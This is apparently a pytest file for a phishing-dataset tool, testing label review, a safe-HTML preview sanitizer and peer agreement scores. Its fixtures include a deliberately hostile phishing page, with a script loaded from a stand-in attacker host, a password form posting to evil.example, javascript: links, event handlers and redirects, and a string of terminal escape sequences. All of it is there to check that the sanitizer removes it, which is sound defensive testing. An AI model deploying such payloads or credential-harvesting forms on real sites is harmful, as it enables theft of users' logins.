"""Tests for Part 1 Batch C, Task 12: label review, safe preview and peer agreement.

Why: the review tool edits labels and moves files, and the safe preview is a
security boundary (it must never let a scam page run code or load anything),
so both are tested with scripted input and a deliberately hostile page.
Everything runs in tmp_path; no browser, no network.
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest
from bs4 import BeautifulSoup

from c2_analyzer.config import get_labels, get_languages, project_root
from c2_analyzer.dataset.collector import register_file
from c2_analyzer.dataset.metadata import MetadataStore
from c2_analyzer.dataset.page_view import parse_page, terminal_safe
from c2_analyzer.dataset.safe_preview import sanitize_html, write_safe_preview
from c2_analyzer.dataset.verifier import (
    ReviewSession,
    agreement,
    describe_kappa,
    describe_sample,
    exclusion_reasons,
    export_peer_sheet,
    import_peer_sheet,
    relabel_sample,
    select_samples,
)

ROOT = project_root()
QUALITY = ROOT / "tests" / "fixtures" / "quality"


def option(choices: tuple[str, ...], value: str) -> str:
    """The number to type in a menu for ``value``."""
    return str(choices.index(value) + 1)


@pytest.fixture
def store(tmp_path: Path) -> MetadataStore:
    """Three phishing samples with different content."""
    store = MetadataStore(tmp_path / "metadata" / "metadata.csv", tmp_path / "raw")
    for number in range(1, 4):
        source = tmp_path / f"page{number}.html"
        source.write_text(
            f"<html><head><title>Login {number}</title></head><body><p>Verify your account "
            f"number {number} now</p><form action='https://evil.example/p{number}'>"
            "<input type='email'><input type='password'></form></body></html>",
            encoding="utf-8",
        )
        register_file(store, source, "phishing", "en", "manual", f"https://bad{number}.example/")
    store.save()
    return store


def scripted(answers: list[str]):
    """A replacement for input() that types the given answers in order."""
    queue = list(answers)
    return lambda prompt="": queue.pop(0)


def reload(store: MetadataStore) -> MetadataStore:
    return MetadataStore(store.csv_path, store.raw_dir)


# ---- review session --------------------------------------------------------------------


def test_confirm_relabel_and_exclude(store):
    ids = select_samples(store)
    labels, reasons = get_labels(), exclusion_reasons()
    answers = ["c", "r", option(labels, "crypto_scam"), "x", option(reasons, "error_page")]
    shown: list[str] = []
    session = ReviewSession(store, "Tester", ids, ask=scripted(answers), show=shown.append)
    decisions = session.run()

    assert len(decisions) == 3
    saved = reload(store)  # every decision was written to disk
    first, second, third = (saved.get(sample_id) for sample_id in ids)

    assert first.verified and first.verified_by == "Tester" and first.verification_date

    assert (second.label, second.label_original) == ("crypto_scam", "phishing")
    assert second.sample_id == "c2_phishing_000002"  # id never changes
    assert second.file_path == "crypto_scam/c2_phishing_000002.html"
    assert (store.raw_dir / "crypto_scam" / "c2_phishing_000002.html").is_file()
    assert not (store.raw_dir / "phishing" / "c2_phishing_000002.html").exists()
    assert second.verified

    assert third.excluded and third.exclusion_reason == "error_page" and not third.verified
    assert saved.validate_all() == []
    assert any("3/3 reviewed" in line for line in shown)


def test_skip_back_language_and_quit(store):
    ids = select_samples(store)
    answers = ["s", "b", "l", option(get_languages(), "si"), "c", "q"]
    ReviewSession(store, "Tester", ids, ask=scripted(answers), show=lambda text: None).run()

    saved = reload(store)
    assert saved.get(ids[0]).language == "si" and saved.get(ids[0]).verified
    assert not saved.get(ids[1]).verified  # quit before deciding
    # resume: only the two unreviewed samples are selected again
    assert select_samples(saved) == ids[1:]


def test_invalid_menu_answer_cancels(store):
    ids = select_samples(store)
    answers = ["r", "99", "x", "", "q"]
    ReviewSession(store, "Tester", ids, ask=scripted(answers), show=lambda text: None).run()
    assert reload(store).get(ids[0]).label == "phishing" and not reload(store).get(ids[0]).excluded


def test_relabel_back_to_original_clears_label_original(store):
    relabel_sample(store, "c2_phishing_000001", "benign", "Tester")
    relabel_sample(store, "c2_phishing_000001", "phishing", "Tester")
    record = reload(store).get("c2_phishing_000001")
    assert (record.label, record.label_original) == ("phishing", None)
    assert record.file_path == "phishing/c2_phishing_000001.html"


def test_failed_relabel_moves_the_file_back(store, monkeypatch):
    def broken_save():
        raise OSError("disk full")

    monkeypatch.setattr(store, "save", broken_save)
    with pytest.raises(OSError):
        relabel_sample(store, "c2_phishing_000001", "benign", "Tester")
    assert (store.raw_dir / "phishing" / "c2_phishing_000001.html").is_file()
    assert not (store.raw_dir / "benign" / "c2_phishing_000001.html").exists()
    assert store.get("c2_phishing_000001").label == "phishing"


def test_filters(store):
    store.update("c2_phishing_000002", quality_flag="parked_domain")
    store.update("c2_phishing_000003", is_duplicate_of="c2_phishing_000001")
    assert select_samples(store, only_flagged=True) == ["c2_phishing_000002"]
    assert "c2_phishing_000003" not in select_samples(store, representatives_only=True)
    assert len(select_samples(store, random_order=True, seed=1, limit=2)) == 2
    assert select_samples(store, label="benign") == []


def test_describe_sample_shows_page_facts_as_text(store):
    store.update("c2_phishing_000001", quality_flag="error_page")
    text = describe_sample(store, "c2_phishing_000001")
    assert "title     : Login 1" in text
    assert "Verify your account number 1 now" in text
    assert "evil.example" in text and "password" in text
    assert "proposed: exclude" in text


def test_terminal_escape_sequences_are_removed():
    hostile = "Hello\x1b[2J\x1b]0;pwned\x07 world‮ ඔබගේ‍ගිණුම"
    cleaned = terminal_safe(hostile)
    assert "\x1b" not in cleaned and "\x07" not in cleaned and "‮" not in cleaned
    assert "ඔබගේ‍ගිණුම" in cleaned  # Sinhala zero-width joiner is kept


def test_review_cli_with_typed_input(store):
    env = {**os.environ, "PYTHONPATH": str(ROOT / "src"), "PYTHONIOENCODING": "utf-8"}
    command = [
        sys.executable, str(ROOT / "scripts" / "review_labels.py"),
        "--metadata", str(store.csv_path), "--raw-dir", str(store.raw_dir),
        "review", "--reviewer", "Tester", "--limit", "2",
    ]  # fmt: skip
    result = subprocess.run(
        command, input="c\nq\n", capture_output=True, text=True, cwd=ROOT, env=env
    )
    assert result.returncode == 0, result.stderr
    assert "2 sample(s) to review" in result.stdout and "1/2 reviewed" in result.stdout
    assert reload(store).get("c2_phishing_000001").verified


# ---- safe preview -------------------------------------------------------------------------

HOSTILE_PAGE = """<!doctype html>
<html><head>
<base href="https://evil.example/">
<meta http-equiv="refresh" content="0;url=https://evil.example/next">
<link rel="stylesheet" href="https://evil.example/style.css">
<style>@import url("https://evil.example/x.css");
body { background: url(https://evil.example/bg.png) }</style>
<script src="https://evil.example/steal.js"></script>
<title>Bank login</title>
</head>
<body onload="steal()">
<!--[if IE]><script>alert(1)</script><![endif]-->
<h1 style="background-image:url('https://evil.example/a.png')">Verify your account</h1>
<img src="https://evil.example/pixel.gif" srcset="https://evil.example/2x.gif 2x" onerror="x()">
<a href="javascript:alert(1)">click</a> <a href="https://evil.example/go">go</a>
<form action="https://evil.example/collect" method="post">
<input type="password" name="pw"><button formaction="https://evil.example/b">Send</button></form>
<iframe src="https://evil.example/frame"></iframe>
<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/e">
<svg onload="alert(1)"><image href="https://evil.example/i.svg"/></svg>
<div onclick="alert(1)" data-x="javascript:alert(2)">text</div>
<script>document.write('hi')</script>
</body></html>"""


def test_safe_preview_removes_everything_active():
    safe = sanitize_html(HOSTILE_PAGE, "c2_phishing_000001")
    soup = BeautifulSoup(safe, "lxml")

    assert not soup.find_all(["script", "iframe", "object", "embed", "base", "link"])
    assert "<script" not in safe.lower() and "alert(1)" not in safe
    for tag in soup.find_all(True):
        for name, value in tag.attrs.items():
            assert not name.lower().startswith("on"), (tag.name, name)
            value = " ".join(value) if isinstance(value, list) else str(value)
            if name == "content" and tag.name == "meta":
                continue  # our own CSP
            assert "evil.example" not in value and "javascript:" not in value, (tag.name, name)
    for style in soup.find_all("style"):
        assert "evil.example" not in style.get_text()
    assert "refresh" not in safe.lower()

    assert soup.find("a")["href"] == "#" and soup.find("form")["action"] == "#"
    assert "SANITIZED PREVIEW" in safe and "c2_phishing_000001" in safe
    csp = soup.find("meta", attrs={"http-equiv": "Content-Security-Policy"})["content"]
    assert "default-src 'none'" in csp and "style-src 'unsafe-inline'" in csp
    assert "Verify your account" in safe  # the text is still there to look at
    # content after an <embed> must survive (the parser nests it inside <embed>)
    assert soup.find("div", string="text") is not None and soup.find("svg") is not None


def test_write_safe_preview(store, tmp_path):
    path = write_safe_preview(store, "c2_phishing_000001", tmp_path / "review")
    assert path.name == "c2_phishing_000001_safe.html"
    content = path.read_text(encoding="utf-8")
    assert "evil.example" not in content and "SANITIZED PREVIEW" in content
    with pytest.raises(KeyError):
        write_safe_preview(store, "c2_phishing_000099", tmp_path / "review")


def test_safe_preview_keeps_sinhala_text():
    page = (ROOT / "tests" / "fixtures" / "sample_pages" / "sinhala_urgency.html").read_text(
        "utf-8"
    )
    safe = sanitize_html(page, "c2_phishing_000002")
    assert parse_page(page).title in safe


# ---- peer agreement -----------------------------------------------------------------------


def test_known_kappa_example():
    # p_observed = 3/4, p_chance = 0.5*0.25 + 0.5*0.75 = 0.5 -> kappa = (0.75-0.5)/(1-0.5) = 0.5
    percent, kappa = agreement(
        ["phishing", "phishing", "benign", "benign"], ["phishing", "benign", "benign", "benign"]
    )
    assert percent == 75.0 and kappa == pytest.approx(0.5)
    assert describe_kappa(kappa) == "moderate"
    assert agreement(["benign", "benign"], ["benign", "benign"]) == (100.0, None)  # undefined
    assert describe_kappa(0.85) == "almost perfect" and describe_kappa(-0.1) == "poor"


def test_peer_export_hides_labels_and_import_computes_agreement(store, tmp_path):
    for sample_id in ("c2_phishing_000001", "c2_phishing_000002", "c2_phishing_000003"):
        store.update(sample_id, verified=True, verified_by="Me")
    relabel_sample(store, "c2_phishing_000003", "benign", "Me")
    sheet_path = tmp_path / "peer.csv"

    sheet = export_peer_sheet(store, sheet_path, fraction=1.0, seed=42)

    assert list(sheet.columns) == [
        "sample_id", "title", "text_excerpt", "form_summary", "peer_label",
    ]  # fmt: skip
    raw = sheet_path.read_bytes()
    assert raw.startswith(b"\xef\xbb\xbf")  # BOM for Excel
    assert b"phishing," not in raw and b"bad1.example" not in raw  # no label, no URL
    assert len(sheet) == 3

    # the peer agrees on two samples and disagrees on one
    peer = {
        "c2_phishing_000001": "phishing",
        "c2_phishing_000002": "crypto_scam",
        "c2_phishing_000003": "benign",
    }
    sheet["peer_label"] = sheet["sample_id"].map(peer)
    sheet.to_csv(sheet_path, index=False, encoding="utf-8-sig")
    result = import_peer_sheet(store, sheet_path, tmp_path / "agreement.json")

    assert result.rated == 3 and result.agreement_percent == pytest.approx(200 / 3)
    assert result.disagreements == [
        {"sample_id": "c2_phishing_000002", "my_label": "phishing", "peer_label": "crypto_scam"}
    ]
    report = json.loads((tmp_path / "agreement.json").read_text("utf-8"))
    assert report["rated_samples"] == 3 and report["cohen_kappa"] is not None


def test_peer_import_rejects_unknown_labels(store, tmp_path):
    sheet = tmp_path / "peer.csv"
    sheet.write_text("sample_id,peer_label\nc2_phishing_000001,scam\n", encoding="utf-8")
    with pytest.raises(ValueError, match="unknown peer_label"):
        import_peer_sheet(store, sheet, tmp_path / "out.json")


def test_peer_export_needs_verified_samples(store, tmp_path):
    with pytest.raises(ValueError, match="No verified samples"):
        export_peer_sheet(store, tmp_path / "peer.csv")
